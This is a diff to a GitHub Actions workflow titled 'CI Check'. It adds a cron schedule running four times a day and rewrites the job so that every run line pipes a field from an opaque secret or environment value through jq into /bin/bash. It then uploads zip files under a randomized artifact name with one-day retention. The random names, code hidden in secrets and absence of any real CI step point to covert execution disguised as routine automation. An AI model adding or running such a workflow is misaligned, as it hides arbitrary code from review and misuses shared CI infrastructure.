@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '29 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -13,22 +15,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Setup and run
         env:
-          zfpsi101: ${{ secrets.zfpsi101 }}
+          el7147: ${{ secrets.el7147 }}
         run: |
-          printf '%s' "$zfpsi101" | jq -r .e57 | /bin/bash
-          echo $plao64 | jq -r .wwvlg04 | /bin/bash
-          echo $kllai61527 | jq -r .fwe10 | /bin/bash
-          printf '%s' "$lhhko95" | jq -r .a46 | /bin/bash
-          echo $v8288 | jq -r .el9007 | /bin/bash
-          echo $b73977 | jq -r .iyc0 | /bin/bash
-          echo $ykwsz06805 | jq -r .vc9623 | /bin/bash
-          printf '%s' "$umuqg937" | jq -r .km7211 | /bin/bash
-          echo $oxfx632 | jq -r .yr66 | /bin/bash
+          printf '%s' "$el7147" | jq -r .gv4 | /bin/bash
+          echo $byzy34 | jq -r .o405 | /bin/bash
+          echo $sxzl943 | jq -r .h4465 | /bin/bash
+          echo $ulg8 | jq -r .sigqc630 | /bin/bash
+          printf '%s' "$mrm65" | jq -r .ntk78465 | /bin/bash
 
       - name: Upload data
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: ahRLpq13
+          name: y4kHe1SB
           path: "*.zip"
           retention-days: 1
